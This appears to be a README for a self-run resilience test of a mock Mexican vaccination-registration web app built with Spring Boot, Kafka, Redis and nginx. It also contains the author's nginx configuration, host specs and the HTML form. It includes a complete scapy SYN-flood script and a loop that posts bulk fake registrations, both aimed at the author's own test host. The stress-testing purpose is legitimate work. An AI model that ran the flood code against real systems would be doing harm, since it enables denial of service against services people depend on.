# Getting Started

### Reference Documentation
For further reference, please consider the following sections:

* [Official Gradle documentation](https://docs.gradle.org)
* [Spring Boot Gradle Plugin Reference Guide](https://docs.spring.io/spring-boot/docs/3.1.0-SNAPSHOT/gradle-plugin/reference/html/)
* [Create an OCI image](https://docs.spring.io/spring-boot/docs/3.1.0-SNAPSHOT/gradle-plugin/reference/html/#build-image)
* [GraalVM Native Image Support](https://docs.spring.io/spring-boot/docs/3.1.0-SNAPSHOT/reference/html/native-image.html#native-image)
* [Spring for Apache Kafka](https://docs.spring.io/spring-boot/docs/3.1.0-SNAPSHOT/reference/htmlsingle/#messaging.kafka)
* [Spring Boot DevTools](https://docs.spring.io/spring-boot/docs/3.1.0-SNAPSHOT/reference/htmlsingle/#using.devtools)
* [Spring Configuration Processor](https://docs.spring.io/spring-boot/docs/3.1.0-SNAPSHOT/reference/htmlsingle/#appendix.configuration-metadata.annotation-processor)
* [Spring Web](https://docs.spring.io/spring-boot/docs/3.1.0-SNAPSHOT/reference/htmlsingle/#web)
* [Thymeleaf](https://docs.spring.io/spring-boot/docs/3.1.0-SNAPSHOT/reference/htmlsingle/#web.servlet.spring-mvc.template-engines)

### Guides
The following guides illustrate how to use some features concretely:

* [Building a RESTful Web Service](https://spring.io/guides/gs/rest-service/)
* [Serving Web Content with Spring MVC](https://spring.io/guides/gs/serving-web-content/)
* [Building REST services with Spring](https://spring.io/guides/tutorials/rest/)
* [Handling Form Submission](https://spring.io/guides/gs/handling-form-submission/)

### Additional Links
These additional references should also help you:

* [Gradle Build Scans – insights for your project's build](https://scans.gradle.com#gradle)
* [Configure AOT settings in Build Plugin](https://docs.spring.io/spring-boot/docs/3.1.0-SNAPSHOT/gradle-plugin/reference/htmlsingle/#aot)

## GraalVM Native Support

This project has been configured to let you generate either a lightweight container or a native executable.
It is also possible to run your tests in a native image.

### Lightweight Container with Cloud Native Buildpacks
If you're already familiar with Spring Boot container images support, this is the easiest way to get started.
Docker should be installed and configured on your machine prior to creating the image.

To create the image, run the following goal:

```
$ ./gradlew bootBuildImage
```

Then, you can run the app like any other container:

```
$ docker run --rm -p 8080:8080 producer-anticovid:0.0.1-SNAPSHOT
```

### Executable with Native Build Tools
Use this option if you want to explore more options such as running your tests in a native image.
The GraalVM `native-image` compiler should be installed and configured on your machine.

NOTE: GraalVM 22.3+ is required.

To create the executable, run the following goal:

```
$ ./gradlew nativeCompile
```

Then, you can run the app as follows:
```
$ build/native/nativeCompile/producer-anticovid
```

You can also run your existing tests suite in a native image.
This is an efficient way to validate the compatibility of your application.

To run your existing tests in a native image, run the following goal:

```
$ ./gradlew nativeTest
```


### Condiciones
Pais México
Conocemos que alrededor de 18,000,000 de personas son mayores de 60 años.
Conocemos las CURP de esos 18,000,000 de personas.
Conocemos de la priandilla de criminal saboteadores que trataran de afectar la operacion.
No se podra bloquear las ip de la banda de bad hombres
Incluso los ciudadanos de Atracomulco tendran derecho al registro

### Ataque
3 host con conectividad minima de 1gb atacara a la app de registro, Se realizara un synflood desde 3 host internos con conectividad de 1gb
mediante el paquete scapy
ejecutando
p = ip / tcp / raw
send(p, loop=1, verbose=0)
Tambien atacaran por medio de post legitimos
Todos los ataques seran permanentes hasta los 18Millones de registros.

### Errores legitimos
Los usuarios podran:
Duplicar correos
Enviar mas un registro para la misma persona
No conocer la curp real en todos los casos

### Requerimientos de los usuarios
Esperan una latencia menor a 1000 milisegundo hasta el puerto de red del host de la app
Esperan una durabilidad garantizada de sus registros
Esperan que sus datos sean tratados respetuosamente sin filtraciones

### El Reto
Registrar correctamente el 100% de aplicaciones
Poder agregar nuevos eventos de manera eficiente
Tener un data mesh para obtener analitica
Mantener la operacion continua sin caidas o bloqueos

### Para efectos de la prueba
Se modificara el formato de la curp simulando que consta de;
8 digitos numericos (00000000)

### Arquitectura
Se poblaran 18 millones de keys sets en una base Redis
Se validara en la forma html los campos
Para responder con la pagina de "Registrado exitosamente";
los deberan contar con minimo con 2 aknowledgmenta de un cluster Kafka.
Se agregara el miembro (correo) una vez registrado en kafka, al key set Redis.
Los keysets que contengan mas 20 miembros deberan notificar que la curp especifica esta bajo ataque y notificaran a la policia pero seguiran permitiendo el registro.
Para tranquilidad de los usuarios si registran mas de un correo al mismo curp se les notificara.

import requests
for num in range(100000, 200000):
    requests.post("https://nx-11.mexicana.mx/registrar", data={"curp": str(num).zfill(8), "email":"b@wf.com"})

#Corregir
Solo permitir POST en /registrar
Actualizar Redis en un consumer de Kafka
Limitar los kb de POST en /registrar
limit_req depende de la pruebas si se permite o no
levantar mas de una instancias de Spring en diferentes puertos en dockers

Python code
Sync_Flood_Atack

!pip3 install --pre scapy[complete]
from scapy.all import *
# target IP address (should be a testing router/firewall)
target_ip = "nx-11"
# the target port u want to flood
target_port = 443
ip = IP(dst=target_ip)
raw = Raw(b"X"*1024)
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
# stack up the layers
p = ip / tcp / raw
# send the constructed packet in a loop until CTRL+C is detected
send(p, loop=1, verbose=0)

===========================================

Clients posting data

!pip3 install requests
import requests
for num in range(100000, 200000):
requests.post("https://nx-11/registrar", data={"curp": str(num).zfill(8), "email":"b@wf.com"})


==========================================

Host characteristics
Google Cloud n1-standard-4

geo@nx-11:~$ lscpu
Architecture:                    x86_64
CPU op-mode(s):                  32-bit, 64-bit
Byte Order:                      Little Endian
Address sizes:                   46 bits physical, 48 bits virtual
CPU(s):                          4
On-line CPU(s) list:             0-3
Thread(s) per core:              2
Core(s) per socket:              2
Socket(s):                       1
NUMA node(s):                    1
Vendor ID:                       GenuineIntel
CPU family:                      6
Model:                           63
Model name:                      Intel(R) Xeon(R) CPU @ 2.30GHz
Stepping:                        0
CPU MHz:                         2299.998
BogoMIPS:                        4599.99
Hypervisor vendor:               KVM
Virtualization type:             full
L1d cache:                       64 KiB
L1i cache:                       64 KiB
L2 cache:                        512 KiB
L3 cache:                        45 MiB
NUMA node0 CPU(s):               0-3
Vulnerability Itlb multihit:     Not affected
Vulnerability L1tf:              Mitigation; PTE Inversion
Vulnerability Mds:               Mitigation; Clear CPU buffers; SMT Host state unknown
Vulnerability Meltdown:          Mitigation; PTI
Vulnerability Mmio stale data:   Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown
Vulnerability Retbleed:          Mitigation; IBRS
Vulnerability Spec store bypass: Mitigation; Speculative Store Bypass disabled via prctl and seccomp
Vulnerability Spectre v1:        Mitigation; usercopy/swapgs barriers and __user pointer sanitization
Vulnerability Spectre v2:        Mitigation; IBRS, IBPB conditional, RSB filling, PBRSB-eIBRS Not affected
Vulnerability Srbds:             Not affected
Vulnerability Tsx async abort:   Not affected
Flags:                           fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss ht syscall nx pdpe1gb rdtscp lm constant_tsc rep_good nopl xtopology n
onstop_tsc cpuid tsc_known_freq pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm abm invpcid_single pti ssb
d ibrs ibpb stibp fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid xsaveopt arat md_clear arch_capabilities

============================================

nginx config
https://www.nginx.com/blog/deploying-nginx-plus-as-an-api-gateway-part-2-protecting-backend-services/

geo@nx-11:/etc/nginx$ cat nginx.conf
user www-data;
worker_processes 4;
pid /run/nginx.pid;
worker_rlimit_nofile 65535;

include /etc/nginx/modules-enabled/*.conf;

#Validar
limit_req_zone $binary_remote_addr zone=client_ip_10rs:1m rate=1r/s;
limit_req_zone $http_apikey        zone=apikey_200rs:1m   rate=200r/s;

events {
worker_connections 768;
# multi_accept on;
}

http {

	##
	# Basic Settings
	##

	sendfile on;
	tcp_nopush on;
	tcp_nodelay on;
	keepalive_timeout 65;
	types_hash_max_size 2048;
	# server_tokens off;

	server_names_hash_bucket_size 64;
	# server_name_in_redirect off;

	include /etc/nginx/mime.types;
	default_type application/octet-stream;

	##
	# SSL Settings
	##

	ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
	ssl_prefer_server_ciphers on;

	##
	# Logging Settings
	##

	#access_log /var/log/nginx/access.log;
	#error_log /var/log/nginx/error.log;

	error_log /dev/null emerg;



	##
	# Gzip Settings
	##

	gzip on;

	gzip_vary on;
	gzip_proxied any;
	gzip_comp_level 6;
	gzip_buffers 16 8k;
	#gzip_http_version 2;
	gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

	##
	# Virtual Host Configs
	##

	include /etc/nginx/conf.d/*.conf;
	include /etc/nginx/sites-enabled/*;
}

==========================================================

geo@nx-11:/etc/nginx$ cat sites-available/nx-11.mexicana.mx
server {

        root /var/www/nx-11.mexicana.mx/html;
        index index.html;

        server_name nx-11.mexicana.mx;

        location / {
		keepalive_timeout 0;
		http2_push img/img.png;
        try_files $uri $uri/ =404;

        }

	location /registrar {
		keepalive_timeout 0;
        proxy_pass http://localhost:8080/registrar;
        #validar
        limit_except POST {
            deny all;
        }
        client_max_body_size 4k;
		
	}


#    listen [::]:443 ssl ipv6only=on; # managed by Certbot
    listen 443 ssl http2 reuseport; # managed by Certbot
    ssl_certificate /etc/letsencrypt/live/nx-11.mexicana.mx/fullchain.pem; # managed by Certbot
    ssl_certificate_key /etc/letsencrypt/live/nx-11.mexicana.mx/privkey.pem; # managed by Certbot
    include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot
    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # managed by Certbot



    # security
    include                 nginxconfig.io/security.conf;


    if ($request_method !~ ^(GET|POST|HEAD|CONNECT)$) {
	return '405';
    }


}
server {
if ($host = nx-11.mexicana.mx) {
return 301 https://$host$request_uri;
} # managed by Certbot


        listen 80;
        #listen [::]:80;

        server_name nx-11.mexicana.mx;
    return 404; # managed by Certbot


}

==========================================================
HTML
geo@nx-11:/etc/nginx$ cat /var/www/nx-11.mexicana.mx/html/index.html
<!DOCTYPE html>

<html>
<head>
<meta http-equiv="Cache-control" content="public">
<meta charset="UTF-8">
<meta name="keywords" content="HTML">
<meta name="author" content="Don Chesquito">
<meta name="viewport" content="width=device-width, initial-scale=1.0">


<title>Sitio falso pruebas Registro ANTICOVID</title>
<link href="data:image/x-icon;base64,AAABAAEAEBAAAAAAAABoBQAAFgAAACgAAAAQAAAAIAAAAAEACAAAAAAAAAEAAAAAAAAAAAAAAAEAAAAAAADUsYIAS6/pAAI29gD9/f4A+fHmAA8x0gC8vroAx6HiACBbtgAHbPMAUIvjAD7f+AA6lt4Ah+L9AKyemQD8/vwA/f78AP7+/ADw+P0ATYDRANvUxgCp+PgA6KfAAPRdwQC1ldQA+P79APDXtQB+W6sAqTWYAPz+/QDLx8sArLypAP7+/QD51qcABB/NAOO2hgBXaacAkDZ+APb49gCguuoA2cK4AAMy6wDI9v4A/f7+ANSYuwAFL+MA/v7+AMV7qgBcQ8gA64PMAPLZuQDv1/kAy2frAMK1zgDt7e0ACTbxAOa8oAAH2vsAxV/hAN6F0ABneOEA4IjxAP7+/wCILHsAb4FkAHjKuAChl+sAZEWSAO3l7ADvv/wA3bOBAA1F6QDaluwAj0DIANG1zwD4+f4Al3VLAB2n7gCEW6YApmnQADJmtADJl+IA8s28AP3a0QDKm74A79GxAP7//gD09PQA///+AGmD5QDXg/EA3j6qAKNOkACe7/4A3Y32AB89pQD1f9IAq+z+AD1k5AD9//8A/v//AP///wBxpJkAYqr9AP3t3wDw8PAAtrydALy0xAD7/voASdbuAP39/QDu7u4A39/fAE7Q3gBQlv0AqntEAEux/ADktZcA+P3+AGnLwgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZWVlZWVlZWVlZEQrZWVlZWVlZWVlYx5hckpOMWVlZWVlZWVlLlxDZwE7HDACLmVlZWVlBGovPyYqGRAFX2JlZWVlR1l3MlZWZWVlEilGZWVlHQwIditlZWVlZRFATBFlZSwYN2VlZWVlZWVlGkg1ZS4kJS5lV29waWllZTM8XmUuFgZlZVc2cGlpbmVlPUVlIUEAZWVlZWVlZWVlZXUfFGUjUi5lZVhlZWVlZQNoU2VlBxNJC3FaNGtlZWVgG1suZStPUU0JOkIOZWU+DRdUZWVlLj4VOSBVZjgtCm10K2VlZWVlZWVlbHMoUCJdD2VlZWVlZWVlZWVlZSdLZWVlZQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=" rel="icon" type="image/x-icon" />
<style>
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
  <img src="img/img.png">
<h1>Sitio falso pruebas Registro ANTICOVID</h1>
  <p style="color:#FF0000";>Este sitio fue creado para realizar pruebas simulando un alto trafico legitimo y ataques de diversos tipos de saboteadores. NO ES OPERACIONAL y ni el gobierno de Mexico, ni ninguna otra autoridad tiene alguna relacion con el mismo. Es mas balin que un billete de $3.- dolares.</p>

 <form action="/registrar" method="post">
    <p>Favor de registrar el CURP de la persona a vacunar.</p>
    <label>CURP:</label><br>
    <input type="text" required
           pattern="^[0-9]{8}$" title="CURP invalida" id="curp" name="curp" value=""><br><br>

    <p>Favor de registrar su correo electronico para notificaciones.</p>
    <label>Correo Electronico:</label><br>
    <input type="email" required id="email" name="email" value=""><br><br>
    <p>Por supuesto no ponemos un CAPTCHA, hacemos el trabajo.</p><br><br>
    <p><input type="submit" value="Enviar" /> <input type="reset" value="Borrar" /></p>
</form>
</body>
</html>

============================




The most important all time, Mexican web app, falling flat :-(
Some years ago when the first anticovid vaccines the Mexican government could handle to get, were assigned to ~ 18 million Mexicans over 60.
In order to handle the vaccination roll-out they ask to register in a web app, this app falls flat the first 24 hours, letting our president naked at the front line. How this could happen?
In the end, some guy just goes out on national tv telling everyone that with a captcha all will be ok, WHAT???
In the following, I will demonstrate one way to avoid this terrible failure and shame for all Mexican IT developers.
All need, is a medium host, nginx, springboot, redis and kafka cluster, for the sync-flood attack, and 3 clients posting legitime traffic at submillisecond rate another host at the same network without any firewall IP blocking configuration or similars, just to make it heavier.
Test objectives
1.- Maintain availability at all costs
2.- Not lose a single registry of citizens

